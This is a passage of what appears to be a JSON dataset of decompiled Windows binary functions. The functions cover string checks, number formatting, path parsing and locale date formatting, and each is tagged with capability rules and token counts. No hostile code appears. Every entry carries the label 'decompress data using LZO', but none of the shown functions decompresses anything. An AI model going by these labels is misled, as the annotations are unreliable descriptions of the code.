        "decompiled_code": "\nuint __fastcall fcn.00409c60(uint param_1, char param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    uint8_t uVar3;\n    char *in_EAX;\n    uint uVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    \n    uVar4 = 0;\n    pcVar5 = in_EAX;\n    if (in_EAX != NULL) {\n        pcVar5 = *(in_EAX + -4);\n    }\n    if (pcVar5 == NULL) {\n        bVar2 = true;\n    }\n    else {\n        cVar1 = *in_EAX;\n        if (((cVar1 + 0xbfU < 0x1a) || (cVar1 == '_')) || (cVar1 + 0x9fU < 0x1a)) {\n            uVar3 = 1;\n        }\n        else {\n            uVar3 = 0;\n        }\n        bVar2 = uVar3 ^ 1;\n    }\n    if (!bVar2) {\n        if (param_2 == '\\0') {\n            pcVar5 = in_EAX;\n            if (in_EAX != NULL) {\n                pcVar5 = *(in_EAX + -4);\n            }\n            if (1 < pcVar5) {\n                pcVar5 = pcVar5 + -1;\n                iVar6 = 2;\n                do {\n                    cVar1 = in_EAX[iVar6 + -1];\n                    if (((9 < cVar1 - 0x30U) && (0x19 < cVar1 + 0xbfU)) && ((cVar1 != '_' && (0x19 < cVar1 + 0x9fU)))) {\n                        return 0;\n                    }\n                    iVar6 = iVar6 + 1;\n                    pcVar5 = pcVar5 + -1;\n                } while (pcVar5 != NULL);\n            }\n        }\n        else {\n            pcVar5 = in_EAX;\n            if (in_EAX != NULL) {\n                pcVar5 = *(in_EAX + -4);\n            }\n            if (1 < pcVar5) {\n                pcVar5 = pcVar5 + -1;\n                iVar6 = 2;\n                do {\n                    cVar1 = in_EAX[iVar6 + -1];\n                    if (((cVar1 != '.') && (9 < cVar1 - 0x30U)) &&\n                       ((0x19 < cVar1 + 0xbfU && ((cVar1 != '_' && (0x19 < cVar1 + 0x9fU)))))) {\n                        return 0;\n                    }\n                    iVar6 = iVar6 + 1;\n                    pcVar5 = pcVar5 + -1;\n                } while (pcVar5 != NULL);\n            }\n        }\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 630
    },
    "00409dcc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409dcc(int16_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint64_t *in_EAX;\n    int32_t iVar3;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar4;\n    float10 fVar5;\n    float10 fVar6;\n    float10 fVar7;\n    char cStack8;\n    \n    if ((*(in_EAX + 4) & 0x80000000) == 0) {\n        fVar7 = *in_EAX;\n    }\n    else {\n        fVar7 = 0x7fffffffffffffff + 1 + (*in_EAX & 0x7fffffffffffffff);\n    }\n    fVar5 = param_1;\n    puVar4 = unaff_ESI;\n    do {\n        puVar4 = puVar4 + -1;\n        fVar6 = fVar7 - (fVar7 / fVar5) * fVar5;\n        fVar7 = fVar7 / fVar5;\n        cStack8 = ROUND(fVar6);\n        uVar2 = cStack8 + 0x30;\n        if (0x39 < uVar2) {\n            uVar2 = cStack8 + 0x37;\n        }\n        *puVar4 = uVar2;\n    } while (1 <= fVar7);\n    iVar3 = param_2 - (unaff_ESI - puVar4);\n    if (unaff_ESI - puVar4 <= param_2 && iVar3 != 0) {\n        iVar1 = -iVar3;\n        while (iVar3 = iVar3 + -1,  iVar3 != 0) {\n            (puVar4 + iVar1)[iVar3] = 0x30;\n        }\n        puVar4[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 421
    },
    "0040a008": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuchar __cdecl fcn.0040a008(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_EDX;\n    int32_t iVar3;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_1h;\n    \n    if (-1 < in_EDX) {\n        var_ch = in_EDX + 1;\n        do {\n            iVar2 = *(arg_8h + -4);\n            iVar3 = *in_EAX;\n            if (iVar2 != 0) {\n                iVar2 = *(iVar2 + -4);\n            }\n            if (iVar3 != 0) {\n                iVar3 = *(iVar3 + -4);\n            }\n            uVar1 = fcn.004059dc(iVar3);\n            fcn.004059dc(iVar2, uVar1);\n            iVar2 = sub.kernel32.dll_CompareStringA_1();\n            if (iVar2 == 2) {\n                return 1;\n            }\n            in_EAX = in_EAX + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    return 0;\n}\n",
        "token_count": 296
    },
    "0040a2bc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040a2bc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    char cVar2;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x40a2d1;\n    fcn.004059cc();\n    uStack32 = 0x40a3a5;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    if (in_EAX == 0) {\n        puStack28 = &stack0xfffffffc;\n        iVar1 = fcn.0040dbc0();\n        *(iVar1 + 0xc) = 3;\n        fcn.00404ec4();\n    }\n    fcn.0040e884();\n    fcn.004055c8();\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    if (in_EAX < 3) {\n        cVar2 = '\\x01';\n    }\n    else {\n        cVar2 = '\\0';\n        fcn.0040a298();\n    }\n    cVar2 = cVar2 == '\\0';\n    if (cVar2) {\n        fcn.0040a5a8();\n        fcn.00405974();\n    }\n    else {\n        cVar2 = '\\x01';\n    }\n    if (cVar2 == '\\0') {\n        fcn.0040a5a8();\n        cVar2 = fcn.0040a2bc();\n        if (cVar2 != '\\0') {\n            fcn.0040a854();\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x40a3ac;\n    uStack32 = 0x40a3a4;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 466
    },
    "0040a520": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.0040a520(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = in_EAX;\n    if (in_EAX != 0) {\n        iVar2 = *(in_EAX + -4);\n    }\n    if (iVar2 == 0) {\n        return 0;\n    }\n    while (cVar1 = fcn.0040e50c(),  cVar1 == '\\x02') {\n        iVar2 = iVar2 + -1;\n    }\n    return in_EAX + -1 + iVar2;\n}\n",
        "token_count": 137
    },
    "0040a554": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040a554(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = param_2;\n    if (param_2 != 0) {\n        iVar3 = *(param_2 + -4);\n    }\n    fcn.004059dc();\n    do {\n        if (iVar3 < 1) {\n            return iVar3;\n        }\n        if ((*(param_2 + -1 + iVar3) != '\\0') && (iVar2 = fcn.0040aa48(),  iVar2 != 0)) {\n            cVar1 = fcn.0040e50c();\n            if (cVar1 != '\\x02') {\n                return iVar3;\n            }\n            iVar3 = iVar3 + -1;\n        }\n        iVar3 = iVar3 + -1;\n    } while( true );\n}\n",
        "token_count": 209
    },
    "0040a5dc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a5dc(uint param_1, uint param_2)\n\n{\n    char *in_EAX;\n    char *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    bool bVar5;\n    \n    pcVar1 = in_EAX;\n    if (in_EAX != NULL) {\n        pcVar1 = *(in_EAX + -4);\n    }\n    if (pcVar1 < 2) {\n        bVar5 = false;\n    }\n    else {\n        bVar5 = in_EAX[1] == ':';\n    }\n    if (bVar5) {\n        fcn.00405a44(param_2);\n    }\n    else {\n        pcVar1 = in_EAX;\n        if (in_EAX != NULL) {\n            pcVar1 = *(in_EAX + -4);\n        }\n        if (pcVar1 < 2) {\n            bVar5 = false;\n        }\n        else {\n            bVar5 = *in_EAX == '\\\\';\n        }\n        if (bVar5) {\n            bVar5 = in_EAX[1] == '\\\\';\n        }\n        else {\n            bVar5 = false;\n        }\n        if (bVar5) {\n            iVar3 = 0;\n            iVar4 = 3;\n            while ((iVar2 = fcn.0040580c(),  iVar4 < iVar2 && (iVar3 < 2))) {\n                if (in_EAX[iVar4 + -1] == '\\\\') {\n                    iVar3 = iVar3 + 1;\n                }\n                if (iVar3 < 2) {\n                    iVar4 = iVar4 + 1;\n                }\n            }\n            fcn.00405a44(param_2);\n        }\n        else {\n            fcn.00405530();\n        }\n    }\n    return;\n}\n",
        "token_count": 406
    },
    "0040a930": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040a930(void)\n\n{\n    fcn.004059dc();\n    fcn.0040a8fc();\n    return;\n}\n",
        "token_count": 34
    },
    "0040a978": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040a978(uint param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t *in_EAX;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    \n    param_2 = param_2 - in_EAX;\n    if (param_2 == 0) {\n        return 0;\n    }\n    while( true ) {\n        uVar1 = in_EAX[param_2];\n        uVar3 = uVar1;\n        puVar2 = in_EAX;\n        if ((uVar1 != *in_EAX) || (uVar1 == 0)) break;\n        uVar1 = in_EAX[param_2 + 1];\n        uVar3 = uVar1;\n        if ((uVar1 != in_EAX[1]) || (uVar1 == 0)) goto code_r0x0040a9fa;\n        uVar1 = in_EAX[param_2 + 2];\n        uVar3 = uVar1;\n        if ((uVar1 != in_EAX[2]) || (uVar1 == 0)) goto code_r0x0040a9f7;\n        uVar1 = in_EAX[param_2 + 3];\n        uVar3 = uVar1;\n        if (uVar1 != in_EAX[3]) goto code_r0x0040a9f4;\n        puVar2 = in_EAX + 4;\n        if (uVar1 == 0) goto code_r0x0040a9f1;\n        uVar1 = puVar2[param_2];\n        uVar3 = uVar1;\n        if ((uVar1 != *puVar2) || (uVar1 == 0)) break;\n        uVar1 = puVar2[param_2 + 1];\n        uVar3 = uVar1;\n        if ((uVar1 != in_EAX[5]) || (uVar1 == 0)) goto code_r0x0040a9fa;\n        uVar1 = puVar2[param_2 + 2];\n        uVar3 = uVar1;\n        if ((uVar1 != in_EAX[6]) || (uVar1 == 0)) goto code_r0x0040a9f7;\n        uVar1 = puVar2[param_2 + 3];\n        uVar3 = uVar1;\n        if (uVar1 != in_EAX[7]) goto code_r0x0040a9f4;\n        in_EAX = in_EAX + 8;\n        puVar2 = in_EAX;\n        if (uVar1 == 0) goto code_r0x0040a9f1;\n    }\ncode_r0x0040a9fd:\n    return *puVar2 - uVar3;\ncode_r0x0040a9f1:\n    puVar2 = puVar2 + -4;\ncode_r0x0040a9f4:\n    puVar2 = puVar2 + 1;\ncode_r0x0040a9f7:\n    puVar2 = puVar2 + 1;\ncode_r0x0040a9fa:\n    puVar2 = puVar2 + 1;\n    goto code_r0x0040a9fd;\n}\n",
        "token_count": 727
    },
    "0040aad8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.0040aad8(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + -4) + -4;\n}\n",
        "token_count": 38
    },
    "0040ab10": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040ab10(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        fcn.00402f1c();\n    }\n    return;\n}\n",
        "token_count": 48
    },
    "0040afb4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040afb4(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    int32_t in_EDX;\n    int32_t arg_10h;\n    uint var_100ch;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = in_EDX;\n    if (in_EDX != 0) {\n        iVar1 = *(in_EDX + -4);\n    }\n    if (iVar1 < 0xc00) {\n        iVar1 = in_EDX;\n        if (in_EDX != 0) {\n            iVar1 = *(in_EDX + -4);\n        }\n        var_ch = fcn.0040aba8(arg_8h, in_ECX, iVar1);\n        iVar1 = 0x1000;\n    }\n    else {\n        iVar1 = in_EDX;\n        var_ch = in_EDX;\n        if (in_EDX != 0) {\n            iVar1 = *(in_EDX + -4);\n            var_ch = iVar1;\n        }\n    }\n    if (var_ch < iVar1 + -1) {\n        fcn.00405620();\n    }\n    else {\n        while (iVar1 + -1 <= var_ch) {\n            iVar1 = iVar1 * 2;\n            fcn.00405530();\n            fcn.00405c6c();\n            arg_10h = in_EDX;\n            if (in_EDX != 0) {\n                arg_10h = *(in_EDX + -4);\n            }\n            var_ch = fcn.0040aba8(arg_8h, in_ECX, arg_10h);\n        }\n        fcn.00405c6c();\n    }\n    return;\n}\n",
        "token_count": 390
    },
    "0040bda8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bda8(uint arg_8h)\n\n{\n    fcn.0040bd64(arg_8h);\n    return;\n}\n",
        "token_count": 36
    },
    "0040beb4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040beb4(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStackY336;\n    uint uStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_14h;\n    uint var_eh;\n    uint var_4h;\n    \n    puStack300 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack304 = 0x40c016;\n    uStack308 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffecc;\n    fcn.00405530();\n    var_14h._0_2_ = *(arg_8h + -0xe);\n    var_14h._2_2_ = *(arg_8h + -0x10);\n    var_eh._0_2_ = *(arg_8h + -0x12);\n    fcn.004055c8();\n    uVar1 = fcn.004059dc(&fcn.0040beb4::var_114h, 0x100);\n    uVar1 = sub.kernel32.dll_GetThreadLocale_1(4, &fcn.0040beb4::var_14h, uVar1);\n    uStackY336 = 0x40bf37;\n    iVar2 = sub.kernel32.dll_GetDateFormatA(uVar1);\n    if (iVar2 != 0) {\n        uStackY336 = 0x40bf51;\n        fcn.004057a0();\n        if (in_EAX == 1) {\n            if (*0x4988cc == 4) {\n                if (*0x4988d0 == 1) {\n                    uStackY336 = 0x40bfb1;\n                    iVar2 = fcn.0040e548();\n                    if (iVar2 == 4) {\n                        fcn.0040e664();\n                        fcn.00405728();\n                        fcn.0040e6e8();\n                        uStackY336 = 0x40bff5;\n                        fcn.00405620();\n                    }\n                }\n            }\n            else if (*0x4988cc == 0x11) {\n                fcn.0040e6e8();\n                fcn.00405a44();\n                uStackY336 = in_EDX;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStackY336;\n    fcn.00405530(0x40c01d);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 610
    },
    "0040c030": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040c030(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char **in_EDX;\n    uint *in_FS_OFFSET;\n    char **ppcStackY332;\n    uint uStack304;\n    uint uStack300;\n    uchar *puStack296;\n    uint var_118h;\n    uint var_114h;\n    uint var_14h;\n    uint var_eh;\n    uint var_4h;\n    \n    puStack296 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack300 = 0x40c11e;\n    uStack304 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed0;\n    fcn.00405530();\n    var_14h._0_2_ = *(arg_8h + -0xe);\n    var_14h._2_2_ = *(arg_8h + -0x10);\n    var_eh._0_2_ = *(arg_8h + -0x12);\n    if (in_EAX < 3) {\n        fcn.004055c8();\n    }\n    else {\n        fcn.004055c8();\n    }\n    uVar1 = fcn.004059dc(&fcn.0040c030::var_114h, 0x100);\n    uVar1 = sub.kernel32.dll_GetThreadLocale_1(4, &fcn.0040c030::var_14h, uVar1);\n    ppcStackY332 = 0x40c0c1;\n    iVar2 = sub.kernel32.dll_GetDateFormatA(uVar1);\n    if (iVar2 != 0) {\n        ppcStackY332 = 0x40c0d7;\n        fcn.004057a0();\n        if ((in_EAX == 1) && (**in_EDX == '0')) {\n            fcn.00405a44();\n            ppcStackY332 = in_EDX;\n        }\n    }\n    *in_FS_OFFSET = ppcStackY332;\n    fcn.00405530(0x40c125);\n    return;\n}\n",
        "token_count": 495
    },
    "0040ca14": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040ca14(int32_t param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffb4;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    int32_t var_14h;\n    int32_t var_10h;\n    uchar var_9h;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_14h = 0;\n    uStack44 = 0x40cada;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    var_9h = 0;\n    puVar1 = &stack0xfffffffc;\n    var_8h = param_2;\n    if (param_1 != 0) {\n        fcn.0040c95c();\n        fcn.00405a44(&var_14h);\n        var_10h = var_14h;\n        iVar3 = param_1;\n        if (param_1 != 0) {\n            iVar3 = *(param_1 + -4);\n        }\n        iVar4 = var_14h;\n        if (var_14h != 0) {\n            iVar4 = *(var_14h + -4);\n        }\n        uVar2 = fcn.004059dc(iVar4);\n        uVar2 = fcn.004059dc(iVar3, uVar2);\n        in_stack_ffffffb4 = 0x400;\n        iVar3 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n        puVar1 = puStack40;\n        if (iVar3 == 2) {\n            if (param_1 != 0) {\n                param_1 = *(param_1 + -4);\n            }\n            *var_8h = *var_8h + param_1;\n            var_9h = 1;\n        }\n    }\n    puStack40 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffb4;\n    fcn.00405530(0x40cae1);\n    return;\n}\n",
        "token_count": 518
    },
    "0040caec": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040caec(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    char cStack16;\n    \n    uVar2 = 0;\n    fcn.0040c95c();\n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    if ((*param_2 <= iVar1) && (cStack16 = param_1,  *(in_EAX + -1 + *param_2) == cStack16)) {\n        *param_2 = *param_2 + 1;\n        uVar2 = 1;\n    }\n    return CONCAT44(param_1, uVar2);\n}\n",
        "token_count": 181
    },
    "0040d1b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong fcn.0040d1b0(void)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    \n    cVar1 = fcn.0040cc6c();\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        if (in_EAX != 0) {\n            in_EAX = *(in_EAX - 4);\n        }\n        uVar2 = in_EAX & 0xffffff00 | in_EAX < 1;\n    }\n    return CONCAT44(1, uVar2);\n}\n",
        "token_count": 136
    },
    "0040d1e8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong fcn.0040d1e8(void)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    \n    cVar1 = fcn.0040cfb8();\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        if (in_EAX != 0) {\n            in_EAX = *(in_EAX - 4);\n        }\n        uVar2 = in_EAX & 0xffffff00 | in_EAX < 1;\n    }\n    return CONCAT44(1, uVar2);\n}\n",
        "token_count": 136
    },
    "0040d254": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040d254(uint param_1, double *param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    double dStack28;\n    \n    uVar3 = 1;\n    cVar1 = fcn.0040cc6c();\n    if (cVar1 == '\\0') {\n        uVar2 = 1;\n    }\n    else {\n        if (in_EAX != 0) {\n            in_EAX = *(in_EAX + -4);\n        }\n        if (in_EAX < 1) {\n            uVar2 = 1;\n        }\n        else {\n            uVar2 = fcn.0040cfb8();\n        }\n        uVar2 = uVar2 ^ 1;\n    }\n    if (uVar2 == 0) {\n        if (dStack28 < *0x40d2ec) {\n            *param_2 = dStack28 - 0.0;\n        }\n        else {\n            *param_2 = dStack28 + 0.0;\n        }\n    }\n    else {\n        uVar3 = fcn.0040d1e8();\n    }\n    return uVar3;\n}\n",
        "token_count": 277
    },
    "0040d678": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040d678(void)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    uStack44 = 0x40d848;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    iVar5 = 1;\n    fcn.00405530();\n    arg_8h = &fcn.0040d678::var_8h;\n    sub.kernel32.dll_GetThreadLocale_1();\n    fcn.0040d33c(arg_8h);\n    iVar3 = fcn.00409f20();\n    if (iVar3 - 3U < 3) {\n        while (iVar3 = fcn.0040580c(),  iVar5 <= iVar3) {\n            uVar4 = *(in_EAX + -1 + iVar5);\n            if ((*((uVar4 >> 3) + 0x492828) >> (uVar4 & 7) & 1) == 0) {\n                iVar3 = fcn.0040aa04();\n                if (iVar3 == 0) {\n                    fcn.00405818();\n                    iVar5 = iVar5 + 1;\n                }\n                else {\n                    iVar3 = fcn.0040aa04();\n                    if (iVar3 == 0) {\n                        fcn.00405818();\n                        iVar5 = iVar5 + 3;\n                    }\n                    else {\n                        iVar3 = fcn.0040aa04();\n                        if (iVar3 == 0) {\n                            fcn.00405818();\n                            iVar5 = iVar5 + 1;\n                        }\n                        else {\n                            cVar1 = *(in_EAX + -1 + iVar5);\n                            if ((cVar1 == 'Y') || (cVar1 == 'y')) {\n                                fcn.00405818();\n                            }\n                            else {\n                                fcn.00405718();\n                                fcn.00405818();\n                            }\n                        }\n                    }\n                }\n                iVar5 = iVar5 + 1;\n            }\n            else {\n                var_4h = fcn.0040e780();\n                arg_8h = &fcn.0040d678::var_10h;\n                fcn.00405a44();\n                fcn.00405818();\n                iVar5 = iVar5 + var_4h;\n            }\n        }\n    }\n    else {\n        if ((*0x4988cc == 4) || (*0x4988cc - 0x11U < 2)) {\n            bVar2 = true;\n        }\n        else {\n            bVar2 = false;\n        }\n        if (bVar2) {\n            for (; iVar3 = fcn.0040580c(),  iVar5 <= iVar3; iVar5 = iVar5 + 1) {\n                cVar1 = *(in_EAX + -1 + iVar5);\n                if ((cVar1 != 'G') && (cVar1 != 'g')) {\n                    fcn.00405718();\n                    fcn.00405818();\n                }\n            }\n        }\n        else {\n            fcn.00405584();\n        }\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack44 = 0x40d84f;\n    iStack48 = 0x40d847;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 872
    },
    "0040e548": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040e548(void)\n\n{\n    fcn.0040e56c();\n    return;\n}\n",
        "token_count": 26
    },
    "0040e56c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040e56c(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    if (param_2 < 1) {\n        bVar1 = true;\n    }\n    else {\n        iVar4 = in_EAX;\n        if (in_EAX != 0) {\n            iVar4 = *(in_EAX + -4);\n        }\n        bVar1 = iVar4 < param_2;\n    }\n    iVar4 = 0;\n    if ((!bVar1) && (iVar4 = param_2,  *0x4988d4 != '\\0')) {\n        iVar3 = 1;\n        iVar4 = 0;\n        if (0 < param_2) {\n            do {\n                uVar2 = *(in_EAX + -1 + iVar3);\n                if ((*((uVar2 >> 3) + 0x492828) >> (uVar2 & 7) & 1) == 0) {\n                    iVar3 = iVar3 + 1;\n                }\n                else {\n                    iVar3 = fcn.0040e7b8();\n                }\n                iVar4 = iVar4 + 1;\n            } while (iVar3 <= param_2);\n        }\n    }\n    return iVar4;\n}\n",
        "token_count": 311
    },
    "0040e5d4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e5d4(int32_t *arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *in_ECX;\n    int32_t in_EDX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    iVar4 = 1;\n    iVar3 = 1;\n    while ((iVar3 < iVar1 && (iVar4 < in_EDX))) {\n        iVar4 = iVar4 + 1;\n        uVar2 = *(in_EAX + -1 + iVar3);\n        if ((*((uVar2 >> 3) + 0x492828) >> (uVar2 & 7) & 1) == 0) {\n            iVar3 = iVar3 + 1;\n        }\n        else {\n            iVar3 = fcn.0040e7b8();\n        }\n    }\n    if (((iVar4 == in_EDX) && (iVar3 < iVar1)) &&\n       (uVar2 = *(in_EAX + -1 + iVar3),  (*((uVar2 >> 3) + 0x492828) >> (uVar2 & 7) & 1) != 0)) {\n        iVar3 = fcn.0040e7b8();\n        iVar3 = iVar3 + -1;\n    }\n    *in_ECX = iVar4;\n    *arg_8h = iVar3;\n    return;\n}\n",
        "token_count": 376
    },
    "0040e664": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040e664(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *in_stack_ffffffe8;\n    int32_t *piVar3;\n    int32_t aiStack20 [2];\n    \n    piVar3 = aiStack20;\n    aiStack20[0] = 0;\n    if (param_2 < 1) {\n        bVar1 = true;\n    }\n    else {\n        iVar2 = in_EAX;\n        if (in_EAX != 0) {\n            iVar2 = *(in_EAX + -4);\n        }\n        bVar1 = iVar2 < param_2;\n    }\n    iVar2 = aiStack20[0];\n    if (((!bVar1) && (iVar2 = param_2,  1 < param_2)) && (iVar2 = param_2,  *0x4988d4 != '\\0')) {\n        fcn.0040e5d4(aiStack20);\n        if (aiStack20[0] < param_2 + -1) {\n            bVar1 = true;\n        }\n        else {\n            if (in_EAX != 0) {\n                in_EAX = *(in_EAX + -4);\n            }\n            bVar1 = in_EAX <= piVar3;\n        }\n        iVar2 = aiStack20[0];\n        if (bVar1) {\n            in_stack_ffffffe8 = NULL;\n        }\n        else {\n            in_stack_ffffffe8 = piVar3 + 1;\n        }\n    }\n    aiStack20[0] = iVar2;\n    return CONCAT44(aiStack20[0], in_stack_ffffffe8);\n}\n",
        "token_count": 388
    },
    "0040e6e8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
